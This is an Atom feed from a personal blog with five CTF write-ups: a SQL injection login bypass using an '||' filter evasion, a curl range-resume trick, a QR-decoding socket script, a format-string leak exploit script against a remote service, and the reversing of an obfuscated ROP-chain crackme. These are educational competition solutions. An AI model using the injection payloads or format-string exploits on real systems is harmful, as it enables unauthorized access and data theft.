<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: Ctf | staring into /dev/null]]></title>
  <link href="http://barrebas.github.io/blog/categories/ctf/atom.xml" rel="self"/>
  <link href="http://barrebas.github.io/"/>
  <updated>2015-04-02T20:17:02+02:00</updated>
  <id>http://barrebas.github.io/</id>
  <author>
    <name><![CDATA[barrebas]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Judge]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge/"/>
    <updated>2015-04-02T20:10:52+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-judge</id>
    <content type="html"><![CDATA[<p>A web challenge! For 100 points, we we&rsquo;re asked to log in as <code>admin</code>.</p>

<!-- more -->


<p>Pointing a browser to the challenge site gave us the option to login, or register. I decided to register <code>testz0r:testz0r</code> and logged in. The login then asked me to login as admin. Well, I had no password for admin. I went back to the register page, thinking there was a SQLi there. That might allow me to inject into the INSERT INTO statement and update the admin&rsquo;s password. Alas, no dice.</p>

<p>I again fired up <code>curl</code> and tried to get some SQLi going on the login form.</p>

<pre><code class="bash">curl http://hack.bckdr.in/JUDGE/index.php --data "username=testz0r' or 'a'='a&amp;password=testz0r"
&lt;!DOCTYPE html&gt;

&lt;html&gt;

&lt;head&gt;
&lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
An Error occured
</code></pre>

<p>After messing around for a while, I remembered that sometimes, keywords like <code>OR</code> and <code>AND</code> are filtered. I tried to substitute <code>OR</code> for <code>||</code> and whadda-ya-know:</p>

<pre><code class="bash">$ curl http://hack.bckdr.in/JUDGE/index.php --data "username=admin'||'1&amp;password=testz0r"
&lt;!DOCTYPE html&gt;

&lt;html&gt;

&lt;head&gt;
&lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
Flag is [REDACTED]
</code></pre>

<p>Done! One filter bypass was all it took.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - LHC]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc/"/>
    <updated>2015-04-02T19:59:55+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-lhc</id>
    <content type="html"><![CDATA[<p><code>LHC</code> was a short &amp; sweet challenge in Backdoor CTF. It had a nice &lsquo;aha-Erlebnis&rsquo; moment.</p>

<!-- more -->


<p>During the CTF, the organizers dropped this challenge. The description mentioned that the flag was hidden in a data file. This data file was kindly provided by the Large Hadron Collider and was 2049 GB large.</p>

<p>I&rsquo;ll let that sink in.</p>

<p>Two-thousand and forty nine <strong>gigabytes</strong>. Downloading it would take more than twenty days. The flag was in the middle of the file, but that still meant downloading more than a terabyte of data.</p>

<p>I fired up <code>curl</code> and looked at the download:</p>

<pre><code>bas@tritonal:~/tmp/bckdr/medusa$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt &gt; /dev/null
* About to connect() to lhc-cdn.herokuapp.com port 443 (#0)
*   Trying 107.21.223.88...
...snip...
&gt; GET /data.txt HTTP/1.1
&gt; User-Agent: curl/7.26.0
&gt; Host: lhc-cdn.herokuapp.com
&gt; Accept: */*
&gt; 
* additional stuff not fine transfer.c:1037: 0 0
* HTTP 1.1 or later with persistent connection, pipelining supported
&lt; HTTP/1.1 200 OK
&lt; Server: Cowboy
&lt; Connection: keep-alive
&lt; X-Powered-By: Express
&lt; Accept-Ranges: bytes
&lt; Content-Type: text/plain; charset=utf-8
&lt; Content-Length: 2200000000000
&lt; Date: Wed, 01 Apr 2015 21:44:48 GMT
&lt; Via: 1.1 vegur
</code></pre>

<p>Yup, 2200000000000 bytes of data. But wait! <code>curl</code> has the option to resume a broken download; that meant that I could control where the download would start. I issued this command and started searching the output for the flag:</p>

<pre><code class="bash">$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1100000000000 &gt; lhc-middle
...snip...
$ strings -n 20 ./lhc-middle
</code></pre>

<p>This gave me part of the flag; the description said it was in the middle of the datafile, so I subtracted another 1000 bytes:</p>

<pre><code>$ curl -vvv https://lhc-cdn.herokuapp.com/data.txt -C 1099999998999 &gt; lhc-middle
$ strings lhc-middle -n 20
              The flag is: [REDACTED]
</code></pre>

<p>Simple, really, once you know the trick.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - QR]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr/"/>
    <updated>2015-04-02T19:43:08+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-qr</id>
    <content type="html"><![CDATA[<p>For this challenge, we had to decode a ton of QR images given to us via a <code>nc</code> connection for 70 points. Sounds like fun!</p>

<!-- more -->


<p>Upon connecting to the service, it tells us we need to decode as much flags as we can. We also get the first flag.</p>

<p><img src="/assets/bckdr/qr-00.png" alt="" />
Right, so I turned to the solution to <a href="https://ctf-team.vulnhub.com/advent-ctf-2014-qr-garden/">QR Garden by Swappage</a>. I liked his approach and decided to do something similar. I installed <code>zbar</code> on my box and cobbled together a python script. That script would connect to the QR service, write out the QR code to disk using <code>PIL</code> and then call <code>zbarimg</code> to decode the QR code. I had some issues at the start because I mixed up the colors of the QR code, but then I was decoding them all pretty rapidly.</p>

<pre><code class="python">from socket import *
from PIL import Image
from os import popen
import re, time, telnetlib

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def getQR(qr):
    im = Image.new("RGB", (94, 94), 'white')

    pixels = im.load()
    print len(qr)
    y = 0
    x = 0
    i = 0
    while i &lt; len(qr):
        if ord(qr[i]) == 0xe2:
            pixels[x,y] = (0, 0, 0)
            pixels[x,y+1] = (0, 0, 0)
            x += 1
        if ord(qr[i]) == 0x20:
            pixels[x,y] = (255, 255, 255)
            pixels[x,y+1] = (255, 255, 255)
            x += 1
        if ord(qr[i]) == 0xa:
            x = 0
            y += 2
        i += 1

    # write out QR to disk  
    im.save('qr.png')

    # ugly hack because ctf
    popen('zbarimg ./qr.png &gt; qr.out')

    with open('qr.out') as f:
        data = f.readline()
        f.close()

    m = re.findall(r'Code:([0-9a-f]*)', data)
    return m[0]

def pwn():
    global s
    s = socket(AF_INET, SOCK_STREAM)
    s.connect(("hack.bckdr.in", 8010))

    readtil('can') # banner

    try:
        while 1:
            time.sleep(0.05)
            qr = readtil(b'\x0a                                          ')
            #print qr
            sendln(getQR(qr))
            response = s.recv(200)
            print response
    except KeyboardInterrupt:
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()
        s.close()

pwn()
</code></pre>

<p>The script was receiving and decoding QR codes quite rapidly, but I didn&rsquo;t receive any flags. I finally just fired up <code>wireshark</code> to grab the flag from the TCP stream:</p>

<p><img src="/assets/bckdr/qr-01.png" alt="" /></p>

<p>Not the most elegant way to grab the flag, but hey, it worked.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF - Team]]></title>
    <link href="http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team/"/>
    <updated>2015-04-02T19:23:27+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/04/02/backdoor-ctf-team</id>
    <content type="html"><![CDATA[<p>Backdoor CTF was hosted on a weekday, so we only had the evening to grab as many flags as we could. Here&rsquo;s how we solved <code>team</code> for 600 points.</p>

<!-- more -->


<p>The binary we&rsquo;ve been given is a 32-bit ELF. The output of strings doesn&rsquo;t give us much. Using <code>strace ./team</code>, it becomes clear that the binary reads from <code>flag.txt</code> so I created one locally. I echoed <code>flag1</code> to the file and restarted the binary.</p>

<p>It asks for a team name and a flag. After receiving these values in heap buffers (non-overflowable as far as I could gather) it proceeds to read the flag from <code>flag.txt</code>. Then, it compares the user input to the flag using <code>strcmp</code>.</p>

<p>The team name is then printed using <code>printf</code>: this is vulnerable to a format string vulnerability:</p>

<pre><code>bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: TEAM%llp
Enter flag: FLAG%llp
TEAM0x64 : incorrect flag. Try again.
</code></pre>

<p>Okay, so let&rsquo;s have a look at the stack when we reach <code>printf</code>. It gets called at <code>8048711</code> to print the team name.</p>

<pre><code>Breakpoint 1, 0x08048711 in ?? ()
gdb-peda$ x/40wx $esp
0xffffd510: 0x0804b008  0x00000064  0x0804b140  0x00000000
0xffffd520: 0x00000000  0x00000000  0x0804b0d8  0x0804b008
0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
0xffffd540: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd550: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd560: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd570: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd580: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd590: 0x00000000  0x00000002  0x00000000  0x856b7a00
0xffffd5a0: 0x00000000  0x00000000  0xffffd5d8  0x0804880c
</code></pre>

<p>What&rsquo;s this then? From breakpointing <code>strcmp</code>, I learned that the flag was on the stack. In fact, it&rsquo;s within reach of the format string vulnerability!</p>

<pre><code>0xffffd530: 0x00000000  0x0804b140  0x67616c66  0x00000031
                          flag1 &gt;&gt;&gt;   g a l f           1
</code></pre>

<p>That&rsquo;s too easy, right? Wrong! The flag starts at <code>%10$p</code>:</p>

<pre><code class="bash">bas@tritonal:~/tmp/bckdr/team-600$ ./team
Enter teamname: %10$p
Enter flag: bleh
0x67616c66 : incorrect flag. Try again.
</code></pre>

<p>It worked remotely with this script:</p>

<pre><code class="python">from socket import *
import struct, telnetlib, re, sys

def readtil(delim):
    buf = b''
    while not delim in buf:
        buf += s.recv(1)
    return buf

def sendln(b):
    s.send(b + b'\n')

def sendbin(b):
    s.sendall(b)

def p(x):
    return struct.pack('&lt;L', x &amp; 0xffffffff)

def pwn(n):
    global s
    s=socket(AF_INET, SOCK_STREAM)
    s.connect(('hack.bckdr.in', 8004))

    readtil('teamname: ')
    sendln("AAAA%"+str(n)+"$p")
    readtil('flag: ')
    sendln("CTF_TEAM_VULNHUB")
    data = readtil('again.')

    s.close()
    m = re.findall(r'0x([0-9a-f]*) :', data)
    return m[0]

full = ''
for i in xrange(10, 30):
    full += pwn(i).decode('hex')[::-1]
    print full
</code></pre>

<p>This spits out the flag until it hits something it can&rsquo;t hex decode. Because the CTF is long-lived, we won&rsquo;t post any flags.</p>

<p>Far too easy for a 600 point challenge, but we&rsquo;re not complaining&hellip;</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[0ctf - R0ops]]></title>
    <link href="http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops/"/>
    <updated>2015-03-30T21:15:09+02:00</updated>
    <id>http://barrebas.github.io/blog/2015/03/30/0ctf-r0ops</id>
    <content type="html"><![CDATA[<p><code>r0ops</code> was a reversing challenge, worth only 150 points. Based on the amount of points, I expected it to be relatively easy, but I was in for a ride down the rabbit hole&hellip;</p>

<!-- more -->


<p></p>

<p>The binary opens binds to a port and waits for incoming connections. Upon connecting with <code>nc</code>, nothing much happens. While trying to run it in <code>gdb</code>, I encountered the first anti-debugger trick:</p>

<pre><code>;;; nice anti-debugger code
 dead448:   ba 00 00 00 00          mov    edx,0x0
 dead44d:   be 01 00 00 00          mov    esi,0x1
 dead452:   bf 02 00 00 00          mov    edi,0x2
 dead457:   e8 c4 32 55 f2          call   400720 &lt;socket@plt&gt;
 dead45c:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
 dead45f:   83 7d fc 03             cmp    DWORD PTR [rbp-0x4],0x3      ; anti-gdb trick
 dead463:   74 07                   je     dead46c &lt;div+0x320&gt;
 dead465:   b8 00 00 00 00          mov    eax,0x0
 dead46a:   eb 50                   jmp    dead4bc &lt;div+0x370&gt;
</code></pre>

<p><code>gdb</code> opens more file descriptors. The binary rightly expects the socket handle to be file descriptor 3; if it encounter anything else, it must be because <code>gdb</code> is running.</p>

<p>Examing the output of <code>objdump</code>, I quickly learned that the main program is just a stub to load a ROP chain:</p>

<pre><code> ;;; accept calls
 dead3af:   eb 02                   jmp    dead3b3 &lt;div+0x267&gt;
 dead3b1:   52                      push   rdx
 dead3b2:   f2 48 83 ec 10          repnz sub rsp,0x10
 dead3b7:   ba 00 00 00 00          mov    edx,0x0
 dead3bc:   be 00 00 00 00          mov    esi,0x0
 dead3c1:   bf 03 00 00 00          mov    edi,0x3
 dead3c6:   e8 45 33 55 f2          call   400710 &lt;accept@plt&gt;
 dead3cb:   89 45 fc                mov    DWORD PTR [rbp-0x4],eax
 dead3ce:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
 dead3d1:   b9 00 00 00 00          mov    ecx,0x0
 dead3d6:   ba 00 10 00 00          mov    edx,0x1000
 dead3db:   be c0 10 0b 0e          mov    esi,0xe0b10c0
 dead3e0:   89 c7                   mov    edi,eax
 dead3e2:   e8 89 32 55 f2          call   400670 &lt;recv@plt&gt;
 dead3e7:   8b 45 fc                mov    eax,DWORD PTR [rbp-0x4]
 dead3ea:   89 c7                   mov    edi,eax
 dead3ec:   b8 00 00 00 00          mov    eax,0x0
 dead3f1:   e8 ca 32 55 f2          call   4006c0 &lt;close@plt&gt;
 dead3f6:   ba a0 f0 0a 0e          mov    edx,0xe0af0a0
 dead3fb:   be a0 00 0b 0e          mov    esi,0xe0b00a0
 dead400:   b8 00 02 00 00          mov    eax,0x200
 dead405:   48 89 d7                mov    rdi,rdx
 dead408:   48 89 c1                mov    rcx,rax
 dead40b:   f3 48 a5                rep movs QWORD PTR es:[rdi],QWORD PTR ds:[rsi]
 dead40e:   b8 c0 10 0b 0e          mov    eax,0xe0b10c0
 dead413:   48 89 c7                mov    rdi,rax                  ; input from socket
 dead416:   b8 c0 20 0b 0e          mov    eax,0xe0b20c0            ; storage
 dead41b:   48 89 c6                mov    rsi,rax
 dead41e:   b8 a0 f8 0a 0e          mov    eax,0xe0af8a0            ; contains a lot of addresses...
 dead423:   48 89 c4                mov    rsp,rax                  ; it's a ROP chain!
 dead426:   c3                      ret                             ; this generates a new program &amp; jumps to it
 dead427:   c9                      leave  
 dead428:   c3                      ret                             
</code></pre>

<p>I set a breakpoint at the <code>ret</code> instruction, just before the ROP chain kicks off. I then dumped and copied the ROP chain and used some shell-fu to clean up the output:</p>

<pre><code class="bash">$ head stackdump 
0xe0af8a0:  0x0dead1f4  0x00000000  0x00000008  0x00000000
0xe0af8b0:  0x0dead271  0x00000000  0xbeef0095  0x1337dead
0xe0af8c0:  0x0dead123  0x00000000  0x0dead0ed  0x00000000
0xe0af8d0:  0x0dead204  0x00000000  0x0dead267  0x00000000
0xe0af8e0:  0x0dead0f8  0x00000000  0x0dead103  0x00000000
0xe0af8f0:  0x0dead0ed  0x00000000  0x0dead27a  0x00000000
0xe0af900:  0x0dead20e  0x00000000  0x0dead0f8  0x00000000
0xe0af910:  0x0dead1ec  0x00000000  0x0000cafe  0x00000000
0xe0af920:  0x0dead141  0x00000000  0x0dead0ed  0x00000000
0xe0af930:  0x0dead204  0x00000000  0x0dead284  0x00000000
$ cat stackdump | sed 's/0x//g' | awk '{print $3 $2"\n" $5 $4}' &gt; ropchain
</code></pre>

<p>Now, the ropchain contained only bare addresses. This is were the second obfuscation step came into place: each ROP gadget starts with a <code>jmp</code> which jumps in the middle of another instruction. Because of this, the disassembly cannot be trusted. Instead, I manually looked up all the ROP gadgets and pieced them together. The ROP chain is quite ingenious, although it also contains tons of redundant instruction:</p>

<pre><code>000000000dead1f4    pop rcx
0000000000000008
000000000dead271    pop r9                          ; r9 = 1337deadbeef0095
1337deadbeef0095
000000000dead123    mov    rax,QWORD PTR [rdi]      ; [rdi+0] first QWORD of input
000000000dead0ed    add    rsi,0x8                  ; rsi=8
000000000dead204    mov    QWORD PTR [rsi],rax      ; rsi=8
000000000dead267    mov    r8,QWORD PTR [rsi]       ; rsi=8 r8 = first QWORD of input
000000000dead0f8    sub    rsi,0x8                  ; rsi=0
000000000dead103    add    rdi,0x8                  ; rdi=8
000000000dead0ed    add    rsi,0x8                  ; rsi=8 (no-op)
000000000dead27a    mov    QWORD PTR [rsi],r9       ; rsi=8 [rsi] = 1337deadbeef0095
000000000dead20e    mov    rax,QWORD PTR [rsi]      ; rsi=8 rax = 1337deadbeef0095
000000000dead0f8    sub    rsi,0x8                  ; rsi=0
000000000dead1ec    pop    rbx                      ; rbx = cafe
000000000000cafe
000000000dead141    imul   rax,rbx                  ; rax ==&gt; 0x2724090c079825d6
000000000dead0ed    add    rsi,0x8                  ; rsi=8
000000000dead204    mov    QWORD PTR [rsi],rax      ; rax = 0x1337deadbeef0095*0xcafe
...continues...
</code></pre>

<p>It basically takes the first QWORD of the input, sent over the socket, and then proceeds to generate a special constant. This is used later to compare against. I followed the rest of the ROP chain, and it basically does the following: it repeatedly multiplies the QWORD of our input with itself. At set intervals, it will multiply this value with the original QWORD. After a fixed number of iterations, it compares the resulting QWORD to the generated magic constant. The ROP chain uses a clever mechanism to implement conditional looping:</p>

<pre><code>000000000dead1ec    pop    rbx                      ; rbx=0
0000000000000000
000000000dead1fc    pop    rdx                      ; rdx=1d8; adjustment for rsp!
00000000000001d8                                    ; 
000000000dead19b    0xdead19f:  cmp    rax,rbx      ; rax contains a counter used to iterate; 
                    0xdead1a2:  jne    0xdead1a7    ; -&gt; ret; if rax != rbx, continue
                    0xdead1a4:  add    rsp,rdx      ; when it reaches zero, control is passed to the next gadget, located at rsp+0x1d8 
</code></pre>

<p>Clever stuff, but horrible to trace. There were a lot of jumps and no ops to throw me off. For instance, a gadget would <code>add rsi, 8</code> and the next one would <code>sub rsi, 8</code>, effectively doing nothing (except annoying me and wearing out my Enter key).</p>

<h2>Breaking the chain</h2>

<p>The ROP chain repeats this process eight times, so we need to send eight QWORDS over the socket. For each QWORD, a new magic constant is generated (taking the former value, multiplying by <code>0xcafe</code> and adding <code>0xbeef</code>). To inspect what was going on, I set breakpoints on two very important ROP gadgets:</p>

<pre><code>Breakpoint 1, 0x000000000dead145 in ?? ()
1: x/i $rip
=&gt; 0xdead145:   imul   rax,rbx


Breakpoint 2, 0x000000000dead1ae in ?? ()
1: x/i $rip
=&gt; 0xdead1ae:   cmp    rax,rbx
</code></pre>

<p>This allowed me to dump each value that was generated, and finally see which values are being compared by the binary (one of which was the magic constant).</p>

<p>I briefly considered bruteforcing the entire 64-bit range, but this was <em>way</em> too slow, even in C. I focussed on creating a function that emulates what is done with the first QWORD. After squashing a bug, I ended up with the following python code:</p>

<pre><code class="python">def p(x, n):
    while n:
        x = (x*x) &amp; 0xffffffffffffffff
        n -= 1
    return x

def c(i):
    x = (p(i, 3) * i) &amp; 0xffffffffffffffff
    x = (p(i, 4) * x) &amp; 0xffffffffffffffff
    x = (p(i, 10) * x) &amp; 0xffffffffffffffff
    x = (p(i, 12) * x) &amp; 0xffffffffffffffff
    return (p(i, 13) * x) &amp; 0xffffffffffffffff

print hex(c(0x4242424241414141)) # remember, little endian ;)
</code></pre>

<p>Then I noticed something crucial. As I entered variations of <code>0x4242424241414141</code>, the last byte of the generated value was only dependent on the last byte of the input (by chance it was also <code>0x41</code>)! This gave me an idea&hellip;</p>

<h2>Byte-by-byte</h2>

<p>I found I could bruteforce the correct value for each QWORD, going one byte at a time! After a while (and squashing the aforementioned bug by careful tracing of the ROP chain) I came up with the following python code:</p>

<pre><code class="python">import struct

def q(x):
    return struct.pack('&lt;Q', x)

def p(x, n):
    while n:
        x = (x*x) &amp; 0xffffffffffffffff
        n -= 1
    return x

def c(i):
    x = (p(i, 3) * i) &amp; 0xffffffffffffffff
    x = (p(i, 4) * x) &amp; 0xffffffffffffffff
    x = (p(i, 10) * x) &amp; 0xffffffffffffffff
    x = (p(i, 12) * x) &amp; 0xffffffffffffffff
    return (p(i, 13) * x) &amp; 0xffffffffffffffff


key_list = []
check = 0x1337deadbeef0095
for u in range(8):
    check = ((check * 0xcafe) + 0xbeef) &amp; 0xffffffffffffffff

    key = 0
    for i in range(8):
        for z in xrange(1,0xff):
            # ugly, but works: it basically only compares the output of the c() function
            # up to the byte it's bruteforcing
            if (c(key | (z &lt;&lt; (i*8))) &amp; (0xff &lt;&lt; i*8)) == (check &amp; (0xff &lt;&lt; i*8)):
                key += (z &lt;&lt; (i * 8))
                break

    print "[+] key {}: {} -&gt; {} == {}".format(u, hex(key), hex(c(key)), hex(check))
    key_list.append(key)

# send all the generated keys as little-endian QWORDS to the binary
from socket import *
global s
s=socket(AF_INET, SOCK_STREAM)
s.connect(('localhost', 13337))

payload = ''
for key in key_list:
    payload += q(key)

s.send(payload+'\n')
print s.recv(1000)

s.close()
</code></pre>

<p>The ROP chain went through its hoops and landed here, dumping the flag!</p>

<pre><code>000000000dead1aa    0xdead1ae:  cmp    rax,rbx
                    0xdead1b1:  je     0xdead1b6  ; if rax == rbx, the special constant and the value generated from our QWORD match
                    0xdead1b3:  add    rsp,rdx    ; if rax == rbx, this is skipped...
                        0xdead1b6:  ret               ;
000000000dead1fc    pop    rdx                    ; ...and the ROP chain continues here...
fffffffffffffc38
000000000dead1d7    loop   0xdead1db              ; ...if all eight QWORDS check out... (rcx contained 8 at the start)
000000000dead33c
   0xdead340:   sub    rsp,0x10                   ; ...then control is passed here
   0xdead344:   mov    edi,0xdead544
   0xdead349:   call   0x400680 &lt;puts@plt&gt;
   0xdead34e:   mov    edi,0xdead54e
   0xdead353:   mov    eax,0x0
   0xdead358:   call   0x4006a0 &lt;printf@plt&gt;
   0xdead35d:   mov    DWORD PTR [rbp-0x4],0x0
   0xdead364:   jmp    0xdead38b
   0xdead366:   mov    eax,DWORD PTR [rbp-0x4]
   0xdead369:   cdqe   
   0xdead36b:   mov    rax,QWORD PTR [rax*8+0xe0b10c0]
   0xdead373:   mov    eax,eax
   0xdead375:   mov    rsi,rax
   0xdead378:   mov    edi,0xdead55d
   0xdead37d:   mov    eax,0x0
   0xdead382:   call   0x4006a0 &lt;printf@plt&gt;
   0xdead387:   add    DWORD PTR [rbp-0x4],0x1
   0xdead38b:   cmp    DWORD PTR [rbp-0x4],0x7
   0xdead38f:   jle    0xdead366
   0xdead391:   mov    edi,0xdead564
   0xdead396:   call   0x400680 &lt;puts@plt&gt;            ; dumps flag in console!
   0xdead39b:   mov    eax,0x0
   0xdead3a0:   call   0xdead3af
   0xdead3a5:   leave  
   0xdead3a6:   ret
</code></pre>

<p>The output of the script and binary:</p>

<pre><code class="bash">bas@tritonal:~/tmp/0ctf/r0ops$ ./r0ops &amp; python ./bf.py
[1] 4471
[+] key 0: 0xd5b028b6c97155a5L -&gt; 0x2724090c0798e4c5L == 0x2724090c0798e4c5L
[+] key 1: 0x51a2c3e8e288fa45 -&gt; 0x44e477ee2e372c65L == 0x44e477ee2e372c65L
[+] key 2: 0x561720a3f926b105 -&gt; 0xa150eec963c67d25L == 0xa150eec963c67d25L
[+] key 3: 0xa325ec548e4e0385L -&gt; 0xeab7d48b9db01ba5L == 0xeab7d48b9db01ba5L
[+] key 4: 0x5369761ad6ccde85 -&gt; 0xf01b0cf36a8c5ea5L == 0xf01b0cf36a8c5ea5L
[+] key 5: 0x9475802813002885L -&gt; 0x930eeb9679f4d8a5L == 0x930eeb9679f4d8a5L
[+] key 6: 0xcadd6a0bdc679485L -&gt; 0xaeb27b8833e1e4a5L == 0xaeb27b8833e1e4a5L
[+] key 7: 0x7d67b37124bcbc85 -&gt; 0x2a900a13b88bcca5L == 0x2a900a13b88bcca5L

YOU WIN!

FLAG IS: 0ctf{c97155a5e288fa45f926b1058e4e0385d6ccde8513002885dc67948524bcbc85}
</code></pre>

<p>Good stuff! Funny to see a ROP chain &ldquo;from the other side&rdquo; :)</p>
]]></content>
  </entry>
  
</feed>
